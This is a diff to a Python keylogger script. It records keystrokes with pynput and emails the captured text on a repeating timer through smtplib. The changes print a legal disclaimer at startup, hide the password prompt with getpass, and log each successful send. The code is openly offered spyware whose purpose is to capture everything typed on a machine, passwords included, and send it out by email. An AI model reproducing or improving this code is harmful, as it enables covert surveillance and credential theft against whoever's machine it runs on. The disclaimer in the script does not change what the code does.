@@ -1,17 +1,21 @@
 from pynput.keyboard import Listener
 from threading import Timer
 from datetime import datetime
+from getpass import getpass
+
 import smtplib
-
-EMAIL_ADDRESS = input("Email Address: ")
-EMAIL_PASSWD = input("Email password: ")
-TIME = float(input("Average sending mail time: "))
-
-now = datetime.now()
 
 disclaimer = """Do not attempt to violate the law. 
 If you planned to use the content for illegal purpose, 
 i'm not be responsible of your actions."""
+
+print("\n" + disclaimer + "\n")
+
+EMAIL_ADDRESS = input("Email Address: ")
+EMAIL_PASSWD = getpass("Email password: ")
+TIME = float(input("Average sending mail time: "))
+
+now = datetime.now()
 
 msg = """ From: Keylogger Script
 To: """ + EMAIL_ADDRESS + """
@@ -36,7 +40,9 @@ def on_press(key):
 
 def send():
     global msg
-    if len(msg)>0: server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
+    if len(msg)>0: 
+        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
+        print("[ - ] " + str(datetime.now()) + ": Message Send!")
     Timer(TIME, send).start()
  
 listener = Listener(on_press=on_press)
